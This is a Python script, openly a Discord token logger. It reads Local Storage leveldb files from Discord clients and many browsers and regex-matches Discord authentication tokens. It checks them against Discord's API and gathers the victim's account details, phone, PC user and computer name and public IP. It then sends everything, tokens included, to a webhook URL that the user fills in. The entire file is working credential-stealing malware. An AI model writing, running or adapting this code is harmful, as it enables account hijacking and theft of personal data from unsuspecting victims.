import os
import re
import requests
import json
webhook = ""  # Input Your WEBHOOK URL Here
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
tokens = []
paths = {
    "Discord": f"{roaming}/Discord/Local Storage/leveldb",
    "Discord Canary": f"{roaming}/DiscordCanary/Local Storage/leveldb",
    "Discord PTB": f"{roaming}/DiscordPTB/Local Storage/leveldb",
    "LigthCord": f"{roaming}/Lightcord/Local Storage/leveldb",
    "Google Chrome": f"{local}/Google/Chrome/User Data/Default/Local Storage/leveldb",
    "Opera": f"{local}/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb",
    "Opera GX": f"${local}/Opera Software/Opera GX Stable/Local Storage/leveldb",
    "Brave": f"{local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
    "Yandex": f"{local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb",
    "Edge": f"{local}/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
    "uCoz": f"{local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb",
    "Epic": f"{local}/Epic Privacy Browser/User Data/Local Storage/leveldb",
    "SxS": f"{local}/Google/Chrome SxS/User Data/Local Storage/leveldb",
    "Vivaldi": f"{local}/Vivaldi/User Data/Default/Local Storage/leveldb",
    "Sputnik": f"{local}/Sputnik/Sputnik/User Data/Local Storage/leveldb",
    "7Star": f"{local}/7Star/7Star/User Data/Local Storage/leveldb",
    "CentBrower": f"{local}/CentBrowser/User Data/Local Storage/leveldb",
    "Orbitum": f"{local}/Orbitum/User Data/Local Storage/leveldb",
    "Kometa": f"{local}/Kometa/User Data/Local Storage/leveldb",
    "Torch": f"{local}/Torch/User Data/Local Storage/leveldb",
    "Amigo": f"{local}/Amigo/User Data/Local Storage/leveldb",
}
def grabber(path):
    for name in os.listdir(path):
        if not name.endswith(".ldb"): continue
        for Opened in open(f"{path}\\{name}", errors="ignore").readlines():
            for findToken in (r"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}", r"mfa\.[\d\w_-]{84}",):
                for token in re.findall(findToken, Opened):
                    tokens.append(token)
def getIP():
    req = requests.get("http://ip-api.com/json/")
    return req.json()["query"]

for p, path in paths.items():
    if os.path.exists(path):
        grabber(path)
        for i in range(len(tokens)):
            req = requests.get("https://discord.com/api/v9/users/@me", headers={"authorization": tokens[i]})
            if not "message" in req.json(): 
                info = req.json()
                data = {
                    "username": "𝐍𝐨𝐭 𝐅𝐮𝐛𝐮𝐤𝐢𝐢 𝐏𝐲𝐭𝐡𝐨𝐧 𝐋𝐞𝐚𝐫𝐧𝐢𝐧𝐠",
                    "avatar_url": "https://cdn.discordapp.com/attachments/879823020682788907/901549246652764180/0f128f389c4ad7cfa9e44fe81ca01059.gif",
                    "content": "",
                    "embeds":  [{
                        "fields": [{
                        "name": "𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲",
                        "value": f'{info["username"]}#{str(info["discriminator"])}'
                    }, {
                        "name": "𝗜𝗗",
                        "value": str(info["id"])
                    }, {
                        "name": "𝗣𝘂𝗯𝗹𝗶𝗰 𝗙𝗹𝗮𝗴𝘀: ",
                        "value": info["public_flags"]
                    }, {
                        "name": "𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲: ",
                        "value": info["locale"]
                    }, {
                        "name": "𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ?: ",
                        "value": info["nsfw_allowed"]
                    }, {
                        "name": "𝗣𝗵𝗼𝗻𝗲 ?: ",
                        "value": info["phone"]
                    }, {
                        "name": "𝐏𝐂 𝐔𝐒𝐄𝐑: ",
                        "value": os.getenv("UserName")
                    },{
                        "name": "𝐏𝐂 𝐧𝐚𝐦𝐞: ",
                        "value": os.getenv("COMPUTERNAME")
                    },{
                        "name": "𝗧𝗼𝗸𝗲𝗻: ",
                        "value": tokens[i]
                    },{
                        "name": "𝐈𝐏 𝐀𝐃𝐃𝐑𝐄𝐒𝐒: ",
                        "value": getIP()
                    }],
                    "image": {
                        "url": "https://thumbs.gfycat.com/DefinitiveAstonishingIchthyostega-size_restricted.gif"
                    },
                    "footer": {
                        "text": "𝐒𝐢𝐞𝐬𝐭𝐚 𝐓𝐨𝐤𝐞𝐧 𝐋𝐨𝐠𝐠𝐞𝐫"
                    },
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{info['id']}/{info['avatar']}.gif?size=128"
                    },
                    "color": 43690,
                    }]
                    
                }
        requests.post(webhook, data = json.dumps(data).encode(), headers = {'Content-Type': "application/json"})


